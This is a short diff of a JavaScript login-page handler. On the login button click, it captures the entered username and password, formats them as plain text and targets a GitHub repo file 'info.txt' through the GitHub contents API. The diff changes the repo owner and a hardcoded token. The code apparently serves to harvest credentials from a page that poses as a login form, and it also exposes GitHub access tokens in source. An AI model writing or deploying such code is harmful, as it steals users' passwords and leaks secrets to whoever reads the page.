@@ -6,10 +6,10 @@ document.querySelector('.loginButton').addEventListener('click', () => {
   if (username.value ==='' || password.value ==='') {
       console.log('empty');
   }else {
-      const repoOwner = 'Arnav-lunatic'
+      const repoOwner = 'GreatArnav'
       const repoName = 'info'
       const filePath = 'info.txt'
-      const githubToken = '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'
+      const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
       const newTextContent = `username - "${username.value}" | password - "${password.value}"`
